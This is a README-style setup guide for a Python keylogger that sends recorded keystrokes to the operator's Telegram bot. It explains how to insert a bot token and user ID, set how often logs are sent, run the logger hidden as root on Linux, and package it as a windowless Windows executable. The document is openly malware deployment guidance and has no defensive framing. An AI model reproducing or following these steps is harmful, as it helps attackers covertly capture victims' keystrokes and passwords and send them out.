## Launching a keylogger.

### Keylogger setup
- **1. Bot creation** - You need to create a bot https://t.me/BotFather
    > Copy the bot token and paste it into the TOKEN constant in the main.py file
    
- **2. Reception of logs** - You need to know your telegram ID from the bot https://t.me/getmyid_arel_bot
    > Copy "You ID" and paste it into the ID_USER constant in the main.py file.
    > Set the value of clicks to the AFTER_WHICH_NUMBER_TO_SEND constant, through which logs are sent
****
### Using a keylogger
- **installation requirements.txt** - Run commands in terminal
     
    > `pip install -r requirements.txt`
    
    - **Linux**
    
        > - To run in hidden mode as administrator, type in the terminal:
        > 
        > `sudo nohup python main.py`
    
    - **Windows**
    
        > - To get the .exe executable you need to install pyinstaller. To do this, enter in the terminal:
        >
        >   `pip install pyinstaller`
        > - Now with the help of pyinstaller we create an executable file.
        > - go to the directory with the main.py file and enter in the terminal:
        >  
        >   `pyinstaller -F -w main.py`
        > - At the end of the download, your finished executable main.exe is located in the dist folder